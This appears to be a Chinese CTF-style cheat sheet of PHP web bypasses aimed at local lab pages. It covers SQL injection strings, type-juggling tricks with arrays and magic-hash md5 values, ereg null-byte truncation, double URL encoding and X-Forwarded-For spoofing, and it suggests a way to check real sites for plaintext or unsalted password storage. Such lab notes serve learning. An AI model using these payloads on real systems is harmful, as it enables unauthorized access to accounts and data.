## 01 extract变量覆盖

`http://127.0.0.1/Php_Bug/extract1.php?shiyan=&flag=1`


## 03 多重加密

```
<?php

$arr = array(['user'] === 'ichunqiu');
$token = base64_encode(gzcompress(serialize($arr)));
print_r($token);
// echo $token;

?>
```

`eJxLtDK0qs60MrBOAuJaAB5uBBQ=`


## 04 SQL注入_WITH ROLLUP绕过


`admin' GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1-- - `

资料：

- [实验吧 因缺思汀的绕过 By Assassin（with rollup统计）](http://blog.csdn.net/qq_35078631/article/details/54772798)
- [使用 GROUP BY WITH ROLLUP 改善统计性能](http://blog.csdn.net/id19870510/article/details/6254358)
- [因缺思汀的绕过](http://www.bubuko.com/infodetail-2169730.html)

## 05 ereg正则%00截断

http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*

资料：

- [eregi()](http://www.am0s.com/functions/203.html)

## 06 strcmp比较字符串

`http://127.0.0.1/Php_Bug/06.php?a[]=1`

这个函数是用于比较字符串的函数

```
int strcmp ( string $str1 , string $str2 )
// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。
```

可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在`5.3`之前的php中，显示了报错的警告信息后，将`return 0` !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。

## 07 sha()函数比较绕过

`http://127.0.0.1/Php_Bug/07.php?name[]=1&password[]=2`

`===`会比较类型，比如`bool`
`sha1()`函数和`md5()`函数存在着漏洞，`sha1()`函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使`sha1()`函数返回错误，也就是返回`false`，这样一来`===`运算符就可以发挥作用了，需要构造`username`和`password`既不相等，又同样是数组类型

`?name[]=a&amp;password[]=b`

## 08 SESSION验证绕过

`http://127.0.0.1/Php_Bug/08.php?password=`

删除`cookies`或者删除`cookies`的值

资料：

- [【Writeup】Boston Key Party CTF 2015(部分题目)](http://blog.csdn.net/lymingha0/article/details/44079981)

## 09 密码md5比较绕过

`?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&pass=123456`

资料：

- [DUTCTF-2015-Writeup](http://bobao.360.cn/ctf/learning/129.html)

## 10 urldecode二次编码绕过

`h`的`URL`编码为：`%68`，二次编码为`%2568`，绕过

`http://127.0.0.1/Php_Bug/10.php?id=%2568ackerDJ`

资料：

- [URL编码表](https://baike.baidu.com/item/URL%E7%BC%96%E7%A0%81/3703727?fr=aladdin)


## 11 sql闭合绕过

构造exp闭合绕过
`admin')#`


## 12 X-Forwarded-For绕过指定IP地址

`HTTP`头添加`X-Forwarded-For:1.1.1.1`

## 13 md5加密相等绕过

`http://127.0.0.1/Php_Bug/13.php?a=240610708`

`==`对比的时候会进行数据转换，`0eXXXXXXXXXX` 转成`0`了，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行 

```
var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
var_dump('0010e2' == '1e3');
var_dump('0x1234Ab' == '1193131');
var_dump('0xABCdef' == ' 0xABCdef');

md5('240610708'); // 0e462097431906509019562988736854 
md5('QNKCDZO'); // 0e830400451993494058024219903391 
```

把你的密码设成 `0x1234Ab`，然后退出登录再登录，换密码 `1193131`登录，如果登录成功，那么密码绝对是明文保存的没跑。 


同理，密码设置为 `240610708`，换密码 `QNKCDZO`登录能成功，那么密码没加盐直接`md5`保存的。

资料：

- [PHP 探测任意网站密码明文/加密手段办法](https://www.v2ex.com/t/188364)

## 14 intval函数四舍五入

`1024.1`绕过

资料：

- [ PHP intval()函数利用](http://blog.csdn.net/wangjian1012/article/details/51581564)

## 15 strpos数组绕过NULL与ereg正则%00截断

- 方法一：
既要是纯数字,又要有`’#biubiubiu’`，`strpos()`找的是字符串,那么传一个数组给它,`strpos()`出错返回`null,null!==false`,所以符合要求. 
所以输入`nctf[]=`
那为什么`ereg()`也能符合呢?因为`ereg()`在出错时返回的也是`null`,`null!==false`,所以符合要求. 

- 方法二：
字符串截断,利用`ereg()`的`NULL`截断漏洞，绕过正则过滤
`http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu` 错误
需将#编码
`http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu`
正确

## 16 SQL注入or绕过

```
$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';
```

`?username=admin\'\' AND pass=\''or 1 #&password=`

## 17 密码md5比较绕过

```
//select pw from ctf where user=''and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #
```

`?user='and 0=1 union select  'e10adc3949ba59abbe56e057f20f883e' #&pass=123456`
